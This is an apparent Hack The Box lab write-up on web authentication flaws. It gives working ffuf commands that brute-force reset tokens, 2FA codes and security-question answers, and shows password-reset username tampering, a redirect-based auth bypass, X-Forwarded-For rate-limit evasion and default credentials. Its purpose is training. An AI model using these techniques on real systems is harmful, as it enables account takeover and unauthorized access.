+<p><img alt="Reset Password Flow Section 5" src="Reset Password Flow Section 5.png" /></p>
+<h3 id="identify-a-weak-reset-token">Identify a Weak Reset Token</h3>
+<p>Example reset URL:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>http://weak_reset.htb/reset_password.php?token=7351
+</span></code></pre></div>
+<p>The token is supplied through the GET parameter <code>token</code>.</p>
+<p>In this example:</p>
+<ul>
+<li>Token: <code>7351</code></li>
+<li>Token length: 4 digits</li>
+<li>Possible values: <code>0000</code> to <code>9999</code></li>
+<li>Total possibilities: 10<sup>4</sup> = 10,000</li>
+</ul>
+<p>A four-digit numeric token has a small search space, making it <strong>potentially vulnerable to brute-force attacks if the application lacks adequate protections</strong>.</p>
+<h3 id="generate-a-token-wordlist">Generate a Token Wordlist</h3>
+<p>Use <strong><code>seq</code></strong> to generate every four-digit value:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>seq<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">9999</span><span class="w"> </span>&gt;<span class="w"> </span>tokens.txt
+</span></code></pre></div>
+<p>The <strong><code>-w</code></strong> option <strong>pads values with leading zeros</strong> so every token has the same length.</p>
+<h3 id="test-reset-tokens-with-ffuf">Test Reset Tokens with FFUF</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>ffuf<span class="w"> </span>-w<span class="w"> </span>./tokens.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>-u<span class="w"> </span><span class="s2">"http://weak_reset.htb/reset_password.php?token=FUZZ"</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>-fr<span class="w"> </span><span class="s2">"The provided token is invalid"</span>
+</span></code></pre></div>
+<p><strong>Example result</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>[Status: 200, Size: 2667, Words: 538, Lines: 90]
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>FUZZ: 6182
+</span></code></pre></div>
+<p>In the example, <strong><code>6182</code></strong> is the candidate token associated with a response that <strong>does not match the configured invalid-token filter</strong>. Verify the response to confirm that the token is valid; a different response alone does not guarantee success.</p>
+<h3 id="question-13">📌 Question 1:3</h3>
+<p><img alt="Ans to Q1-3 in Section5" src="Ans to Q1-3 in Section5.png" /></p>
+<h3 id="question-4">📌 Question 4</h3>
+<p><strong>After Request Reset Password for user <code>admin</code>, use fuff to guess token</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>seq<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">9999</span><span class="w"> </span>&gt;<span class="w"> </span>tokens.txt
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>ffuf<span class="w"> </span>-w<span class="w"> </span>./tokens.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>-u<span class="w"> </span><span class="s2">"http://154.57.164.76:31282/reset_password.php?token=FUZZ"</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>-fr<span class="w"> </span><span class="s2">"The provided token is invalid"</span>
+</span></code></pre></div></p>
+<p><strong>Result</strong>
+<img alt="Result Q4 in Section5" src="Result Q4 in Section5.png" /></p>
+<h2 id="section-6">Section 6</h2>
+<h3 id="understanding-2fa">Understanding 2FA</h3>
+<p>Two-factor authentication (2FA) adds a second verification step to protect accounts, even if an attacker knows the user's password.</p>
+<p>It combines two different authentication factors:</p>
+<ul>
+<li><strong>Knowledge</strong>: Something you know, such as a password.</li>
+<li><strong>Ownership</strong>: Something you have, such as a phone or authenticator app.</li>
+<li><strong>Inherence</strong>: Something you are, such as a fingerprint.</li>
+</ul>
+<p>A common implementation combines a password with a one-time password (OTP) delivered by SMS or generated by an authenticator app.</p>
+<h3 id="identify-the-2fa-mechanism">Identify the 2FA Mechanism</h3>
+<p>In this HTB lab, the assumed credentials are:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>Username: admin
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>Password: admin
+</span></code></pre></div>
+<p>After login, the application redirects to <code>/2fa.php</code> and requests a 4-digit OTP.</p>
+<p>There are 10,000 possible codes, from <code>0000</code> to <code>9999</code>.</p>
+<p>Inspect the 2FA request using Burp Suite or the browser's Developer Tools. The example request uses:</p>
+<ul>
+<li>Endpoint: <code>/2fa.php</code></li>
+<li>Method: <code>POST</code></li>
+<li>POST parameter: <code>otp</code></li>
+<li>Session cookie: <code>PHPSESSID</code></li>
+<li>Failure message: <code>Invalid 2FA Code</code></li>
+</ul>
+<p>The session cookie associates the OTP verification request with the session that has already passed password authentication.</p>
+<h3 id="understand-the-ffuf-request">Understand the FFUF Request</h3>
+<p><strong>Generate a 4-Digit OTP Wordlist</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>seq<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">9999</span><span class="w"> </span>&gt;<span class="w"> </span>tokens.txt
+</span></code></pre></div></p>
+<p><strong>The request components are:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>ffuf<span class="w"> </span>-w<span class="w"> </span>./tokens.txt<span class="w"> </span>-u<span class="w"> </span>http://bf_2fa.htb/2fa.php<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">"Content-Type: application/x-www-form-urlencoded"</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">"PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93"</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">"otp=FUZZ"</span><span class="w"> </span>-fr<span class="w"> </span><span class="s2">"Invalid 2FA Code"</span>
+</span></code></pre></div></p>
+<p><strong>the Results</strong></p>
+<p>The HTB example returns several matches, including:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>[Status: 302, Size: 0, Words: 1, Lines: 1]
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>FUZZ: 6513
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>[Status: 302, Size: 0, Words: 1, Lines: 1]
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>FUZZ: 6514
+</span></code></pre></div>
+<p>Why are there multiple results?</p>
+<p><strong>Once the correct OTP is submitted, the session may become fully authenticated</strong>. Subsequent requests using that session can then receive redirects instead of the usual invalid-code response. Those later responses may also appear as FFUF matches.</p>
+<p>Therefore, the first match, <code>6513</code>, is the likely correct OTP in the provided example, but the redirect and authenticated session should be verified to confirm it.</p>
+<p><strong>After successful verification, the lab indicates that the authenticated session can access <code>/admin.php</code></strong>.</p>
+<h3 id="question_1">📌 Question</h3>
+<p><img alt="Q in Section6" src="Q in Section6.png" /></p>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>seq<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">9999</span><span class="w"> </span>&gt;<span class="w"> </span>tokens.txt
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>ffuf<span class="w"> </span>-w<span class="w"> </span>./tokens.txt<span class="w"> </span>-u<span class="w"> </span>http://154.57.164.64:31107/2fa.php<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">"Content-Type: application/x-www-form-urlencoded"</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">"PHPSESSID=o636kajhp7c3unb4ng2jua4m83"</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">"otp=FUZZ"</span><span class="w"> </span>-fr<span class="w"> </span><span class="s2">"Invalid 2FA Code"</span>
+</span></code></pre></div>
+<img alt="Q in Section6 Part2" src="Q in Section6 Part2.png" /></p>
+<p><img alt="Result Q in Section6" src="Result Q in Section6.png" /></p>
+<h2 id="section-7">Section 7</h2>
+<h3 id="overview">Overview</h3>
+<p>Brute-force protection mechanisms prevent attackers from submitting large numbers of authentication attempts automatically.</p>
+<p>Two common mechanisms are:</p>
+<ul>
+<li><strong>Rate Limiting</strong>: Restricts how many requests a user or client can make within a specific time.</li>
+<li><strong>CAPTCHA</strong>: Presents a challenge designed to distinguish humans from automated scripts.</li>
+</ul>
+<h3 id="rate-limits">Rate Limits</h3>
+<p>Rate limiting <strong>controls the frequency of requests to protect applications from brute-force attacks</strong>, abuse, and excessive traffic.</p>
+<p><strong>How it works</strong></p>
+<p>A web application may:</p>
+<ul>
+<li>Allow only a certain number of login attempts within a time window.</li>
+<li>Introduce increasing delays after failed attempts.</li>
+<li>Temporarily block further attempts after a threshold is reached.</li>
+</ul>
+<p><strong>Potential weakness: <code>X-Forwarded-For</code></strong></p>
+<p>Applications behind reverse proxies or load balancers may see the proxy's IP address instead of the original client's address.</p>
+<p>Some applications use the HTTP header <strong><code>X-Forwarded-For</code> to identify the originating IP address</strong>.</p>
+<p>Example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>X-Forwarded-For: 192.0.2.10
+</span></code></pre></div>
+<p>If an application <strong>blindly trusts this client-controlled header, an attacker may supply different values in successive requests, potentially bypassing IP-based rate limiting</strong>.</p>
+<h3 id="captchas">CAPTCHAs</h3>
+<p><strong>CAPTCHA</strong> stands for Completely Automated Public Turing test to tell Computers and Humans Apart.</p>
+<p>It attempts to <strong>distinguish human users from automated clients</strong> before allowing an action, such as submitting a login form.</p>
+<p><strong>Common types include:</strong></p>
+<ul>
+<li>Distorted-text recognition.</li>
+<li>Selecting specific objects in images.</li>
+<li>Puzzle-based challenges.</li>
+<li>Audio challenges.</li>
+</ul>
+<p>CAPTCHAs can make automated attacks more difficult, but they can also create accessibility and usability problems.</p>
+<p><strong>Potential weakness: Exposed CAPTCHA solutions</strong></p>
+<p>A CAPTCHA implementation is flawed <strong>if the expected solution is exposed to the client in a way that allows an attacker to retrieve it without solving the challenge</strong>.</p>
+<p><strong>For example, inspect the page's HTML and network responses to determine whether the expected answer is accidentally included in client-visible data.</strong></p>
+<p><img alt="CAPTCHAs" src="CAPTCHAs.png" /></p>
+<h2 id="section-8">Section 8</h2>
+<h3 id="understanding-default-credentials">Understanding Default Credentials</h3>
+<p><strong>Default credentials</strong> are usernames and passwords provided by vendors during installation or initial setup.</p>
+<p>If administrators fail to change them, attackers may gain unauthorized access to the application.</p>
+<p><strong>Common examples include:</strong></p>
+<ul>
+<li><code>admin:password</code></li>
+<li><strong>Vendor-specific default</strong> usernames and passwords.</li>
+<li><strong>Default administrator accounts</strong> documented in installation guides.</li>
+</ul>
+<p>Testing for default credentials is an important part of authentication security testing and is covered by the <a href="https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/04-Authentication/02-Default_Credentials/">OWASP Web Security Testing Guide</a>.</p>
+<h3 id="finding-default-credentials">Finding Default Credentials</h3>
+<h4 id="method-1-search-default-credential-databases">Method 1: Search default credential databases</h4>
+<p>Use <strong>vendor-specific databases</strong> to identify credentials associated with a product or device.</p>
+<ul>
+<li><a href="https://www.cirt.net/passwords">CIRT.net Default Password Database</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials">SecLists — Default Credentials</a></li>
+<li><a href="https://github.com/scadastrangelove/SCADAPASS/tree/master">SCADAPASS</a> — default password references for various industrial vendors.</li>
+</ul>
+<p><strong>Example: If you identify a Cisco device during an authorized penetration test, search the database for default credentials for Cisco devices</strong></p>
+<h4 id="method-2-search-the-internet">Method 2: Search the internet</h4>
+<p>Search for the application's name along with terms such as <code>default credentials</code>, <code>default login</code>, or <code>installation guide</code>.</p>
+<p>Example search:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>BookStack<span class="w"> </span>default<span class="w"> </span>credentials
+</span></code></pre></div>
+<p><strong>Installation documentation may reveal the initial administrator account</strong>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>Email:    admin@admin.com
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>Password: password
+</span></code></pre></div>
+<p><img alt="Search the internet" src="Search the internet.png" /></p>
+<h2 id="section-9">Section 9</h2>
+<h3 id="guessable-password-reset-questions">Guessable Password Reset Questions</h3>
+<p>Web applications may use <strong>predefined security questions to verify a user's identity before allowing a password reset.</strong></p>
+<p><strong>Examples include:</strong></p>
+<ul>
+<li>What is your mother's maiden name?</li>
+<li>What city were you born in?</li>
+</ul>
+<p>These questions are often <strong>vulnerable because their answers may be predictable</strong>, publicly available through OSINT, or discoverable through brute-force attacks when protections are missing.</p>
+<p><strong>Suppose the application asks for the city where the target was born</strong>. A list of cities can be used to create a wordlist <a href="https://github.com/datasets/world-cities/blob/main/data/world-cities.csv">world-cities.csv</a>.</p>
+<p>Extract city names from a CSV file:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>cat world-cities.csv | cut -d ',' -f1 &gt; city_wordlist.txt
+</span></code></pre></div>
+<p>Count the entries:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>wc -l city_wordlist.txt
+</span></code></pre></div>
+<p>Example output:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>26468 city_wordlist.txt
+</span></code></pre></div>
+<p><strong>If you have information about the target's country, you can reduce the wordlist:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>cat world-cities.csv | grep Germany | cut -d ',' -f1 &gt; german_cities.txt
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>wc -l german_cities.txt
+</span></code></pre></div>
+<p>Example output:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>1117 german_cities.txt
+</span></code></pre></div>
+<p><strong>The application may follow this process:</strong></p>
+<ol>
+<li>Submit the target username.</li>
+<li>Answer the security question.</li>
+<li>Submit a new password.</li>
+</ol>
+<p><strong>Test security-question validation</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>ffuf<span class="w"> </span>-w<span class="w"> </span>./city_wordlist.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>-u<span class="w"> </span>http://pwreset.htb/security_question.php<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>-H<span class="w"> </span><span class="s2">"Content-Type: application/x-www-form-urlencoded"</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>-b<span class="w"> </span><span class="s2">"PHPSESSID=&lt;SESSION_ID&gt;"</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>-d<span class="w"> </span><span class="s2">"security_response=FUZZ"</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>-fr<span class="w"> </span><span class="s2">"Incorrect response."</span>
+</span></code></pre></div>
+<h3 id="manipulating-the-reset-request">Manipulating the Reset Request</h3>
+<p>Another business logic flaw occurs when the application <strong>trusts a username supplied by the client instead of securely binding the reset process to the account initially selected</strong>.</p>
+<p><strong>Step 1: Submit your own username</strong></p>
+<p>For example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>POST /reset.php HTTP/1.1
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>Host: pwreset.htb
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>Content-Type: application/x-www-form-urlencoded
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>username=htb-stdnt
+</span></code></pre></div>
+<p>The application begins the password reset process for <code>htb-stdnt</code>.</p>
+<p><strong>Step 2: Submit the security answer</strong></p>
+<p>The next request includes the username as a hidden form parameter:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>POST /security_question.php HTTP/1.1
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>Host: pwreset.htb
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>Content-Type: application/x-www-form-urlencoded
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>security_response=London&amp;username=htb-stdnt
+</span></code></pre></div>
+<p><strong>The <code>username</code> is client-controlled because it is included in the request. Hidden parameters are not inherently secure; users can modify them.</strong></p>
+<p><strong>Step 3: Inspect the final password reset request</strong></p>
+<p>The application sends another username parameter when submitting the new password:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>POST /reset_password.php HTTP/1.1
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>Host: pwreset.htb
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>Content-Type: application/x-www-form-urlencoded
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>password=&lt;NEW_PASSWORD&gt;&amp;username=htb-stdnt
+</span></code></pre></div>
+<p><strong>The key question is whether the server verifies that this username belongs to the same account whose security question was successfully answered</strong>.</p>
+<p><strong>Step 4: Test for inconsistent account validation</strong></p>
+<p>In an authorized lab, modify the final request's username to another test account and observe the result.</p>
+<p>For example, changing:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>username=htb-stdnt
+</span></code></pre></div>
+<p>to:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>username=admin
+</span></code></pre></div>
+<p>tests whether the application incorrectly allows the final request to target a different account.</p>
+<p>If the server accepts the change without verifying the original reset authorization, <strong>an attacker may be able to reset another user's password without answering that user's security question</strong>.</p>
+<p><strong>Root cause:</strong> The application <strong>fails</strong> to bind the verified identity to the entire password reset transaction.</p>
+<h3 id="question-1_1">📌 Question 1</h3>
+<p><strong>Step 1: Reset Passowrd for username <code>admin</code></strong></p>
+<p><strong>Step 2: submit any city and capture the request using Network tab</strong>
+<img alt="Q1 in Section9" src="Q1 in Section9.png" /></p>
+<p><strong>Step 3: download list of cities can be used to create a wordlist <a href="https://github.com/datasets/world-cities/blob/main/data/world-cities.csv">world-cities.csv</a> and Extract cities from this</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>cat<span class="w"> </span>world-cities.csv<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span><span class="s1">','</span><span class="w"> </span>-f1<span class="w"> </span>&gt;<span class="w"> </span>city_wordlist.txt
+</span></code></pre></div>
+<p><strong>Step 4: brute force using fuff</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>ffuf<span class="w"> </span>-w<span class="w"> </span>./city_wordlist.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>-u<span class="w"> </span>http://154.57.164.66:42107/security_question.php<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>-H<span class="w"> </span><span class="s2">"Content-Type: application/x-www-form-urlencoded"</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>-b<span class="w"> </span><span class="s2">"PHPSESSID=qfjm3nlmejmgj4g91jih0211k9"</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>-d<span class="w"> </span><span class="s2">"security_response=FUZZ"</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a>-fr<span class="w"> </span><span class="s2">"Incorrect response."</span>
+</span></code></pre></div>
+<p><img alt="Result Q1 in Section9" src="Result Q1 in Section9.png" /></p>
+<h3 id="question-2_1">📌 Question 2</h3>
+<p><strong>After Reseting password from Q1, just login with <code>admin</code> and <code>{new_password}</code></strong>
+<img alt="Result Q2 in Section9" src="Result Q2 in Section9.png" /></p>
+<h2 id="section-10">Section 10</h2>
+<h3 id="overview_1">Overview</h3>
+<p><strong>Direct access authentication bypass</strong> occurs when a web application <strong>fails to enforce authentication checks</strong> on protected resources or returns protected content before completing the authentication check.</p>
+<p>For example, a website may <strong>redirect unauthenticated users from <code>/admin.php</code> to the login page</strong>. However, if the server still includes the admin page's content in the response body, <strong>the protected information may remain accessible</strong>.</p>
+<h3 id="how-the-vulnerability-works">How the Vulnerability Works</h3>
+<p>Suppose a website redirects authenticated users to <strong><code>/admin.php</code></strong> after login.</p>
+<p>An attacker can try accessing the endpoint directly without logging in:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>GET /admin.php HTTP/1.1
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>Host: target.htb
+</span></code></pre></div>
+<p><strong>If the server does not properly enforce authentication, it may return the protected content</strong>.</p>
+<p><strong>Vulnerable PHP code</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>if (!$_SESSION['active']) {
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>    header("Location: index.php");
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>}
+</span></code></pre></div>
+<p>The problem is that <strong><code>header("Location: index.php")</code></strong> sends a redirect response but does not stop PHP execution.</p>
+<p>As a result, the application may continue executing the script and <strong>include the protected page's content in the response body</strong>, even though the response status is <strong><code>302 Found</code></strong>.</p>
+<p><strong>Testing with Burp Suite</strong></p>
+<ol>
+<li>Open Burp Suite and enable Proxy interception.</li>
+<li>Request a protected endpoint such as <code>/admin.php</code> without authenticating.</li>
+<li>Inspect the server response.</li>
+<li>Check whether the response body contains protected content despite the redirect.</li>
+<li>If necessary, use Burp's Do intercept → <strong>Response to this request option to inspect the response before forwarding it</strong>.</li>
+<li><strong>In an authorized lab</strong>, change the response status from <code>302 Found</code> to <code>200 OK</code> and forward it to observe whether the browser renders the content.</li>
+</ol>
+<p><img alt="image1 Section10" src="image-1.png" />
+<img alt="image2 Section10" src="image-2.png" />
+<img alt="image3 Section10" src="image-3.png" /></p>
+<p><strong>How to Fix It</strong></p>
+<p>The <strong>PHP script must stop execution immediately</strong> after sending the redirect.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>if (!$_SESSION['active']) {
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>    header("Location: index.php");
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>    exit;
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>}
+</span></code></pre></div>
+<p>The <strong><code>exit</code></strong> statement prevents the remaining script from executing.</p>
+<h3 id="question_2">📌 Question</h3>
+<ol>
+<li>Open Burp Suite and enable Proxy interception.</li>
+<li>Request a protected endpoint such as <code>/admin.php</code> without authenticating.</li>
+<li>Inspect the server response.</li>
+<li>use Burp's Do intercept → <strong>Response to this request option to inspect the response before forwarding it</strong>.</li>
+<li>change the response status from <code>302 Found</code> to <code>200 OK</code> and forward it to observe whether the browser renders the content.</li>
+</ol>
+<p><img alt="Result Q in Section10" src="Result Q in Section10.png" /></p>
+<h2 id="section-11">Section 11</h2>
+<h3 id="overview_2">Overview</h3>
+<p><strong>Authentication bypass via parameter modification</strong> occurs when a web application incorrectly relies on a client-controlled HTTP parameter to determine a user's identity or privileges.</p>
+<p>An attacker may modify or remove parameters in a URL or request to bypass authentication checks or gain unauthorized access to privileged functionality.</p>
+<p>This vulnerability can overlap with Insecure Direct Object Reference (IDOR) and broken access control.</p>
+<h3 id="understanding-the-vulnerability">Understanding the Vulnerability</h3>
+<p>Suppose a user logs in with the account <code>htb-stdnt</code>. After successful login, the application redirects them to:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>/admin.php?user_id=183
+</span></code></pre></div>
+<p>The page displays limited information and reports insufficient privileges.</p>
+<p>The <code>user_id</code> parameter may be influencing how the application identifies the user or determines their access level.</p>
+<p><strong>Step 1: Inspect the parameter</strong></p>
+<p>Check the URL and HTTP requests in Burp Suite.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>GET /admin.php?user_id=183 HTTP/1.1
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>Host: target.htb
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>Cookie: PHPSESSID=&lt;SESSION_ID&gt;
+</span></code></pre></div>
+<p>Observe how the application responds when the parameter is present.</p>
